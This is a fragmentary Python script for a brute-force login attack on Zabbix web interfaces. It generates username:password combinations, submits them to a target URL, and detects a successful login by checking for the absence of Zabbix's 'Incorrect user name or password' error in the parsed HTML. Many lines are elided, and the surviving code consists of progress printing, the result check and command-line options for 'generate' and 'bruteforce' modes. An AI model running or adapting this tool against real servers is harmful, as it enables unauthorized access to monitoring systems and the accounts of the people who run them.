            ...
            for username in usernames:
                for password in passwords:
                    ...
                    if processed % 10000 == 0:
                        ...
                        print(Fore.CYAN + f"\rProgress: {processed:,}/{total:,} | Speed: {speed:,.0f} combos/s | Remaining: {remaining:.1f}s", end='')
...
def bruteforce_attack(target_url, combinations_file, delay=1):
    ...
    try:
        with open(combinations_file, 'r', encoding='utf-8') as f, open("suspicious_login_attempts.log", 'a', encoding='utf-8') as log:
            for i, line in enumerate(f):
                ...
                try:
                    ...
                    print(Fore.WHITE + f"\r[*] Test {i+1:,}/{total:,} | {username}:{password} | Status: {response.status_code}", end='')

                    # HTML parsing with BeautifulSoup
                    soup = BeautifulSoup(response.text, 'lxml')
                    error_div = soup.select_one('div.signin-container form ul li div.red')
                    error_text = error_div.get_text(strip=True) if error_div else ""

                    # Zabbix login failure check
                    if "Incorrect user name or password or account is temporarily blocked." not in error_text:
...
def main():
    ...
    parser = argparse.ArgumentParser(description='Generate combos and perform BruteForce attacks (no save file).')
    subparsers = parser.add_subparsers(dest='command', required=True)

    combo_parser = subparsers.add_parser('generate', help='Generate username:password combinations')
    ...
    brute_parser = subparsers.add_parser('bruteforce', help='Execute brute force attack')
